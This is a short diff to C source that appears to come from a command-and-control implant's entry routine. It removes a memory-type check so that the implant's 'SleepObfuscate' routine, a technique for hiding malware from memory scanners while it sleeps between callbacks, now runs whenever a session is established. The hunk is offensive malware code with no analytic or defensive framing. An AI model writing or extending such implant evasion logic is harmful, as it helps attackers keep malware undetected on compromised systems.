@@ -170,14 +170,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					Inb = NULL;
 				};
 				if ( Ctx->Established != FALSE ) {
-					if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_PTR( Start ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
-						if ( Mbi.Type == MEM_PRIVATE ) {
-							/* Obfuscate for a brief period of time */
-							SleepObfuscate( ROGUE_WAIT_PERIOD );
-						} else {
-							/* Sleep for a brief period of time */
-						};
-					};
+					SleepObfuscate( ROGUE_WAIT_PERIOD );
 				};
 			};
 		};
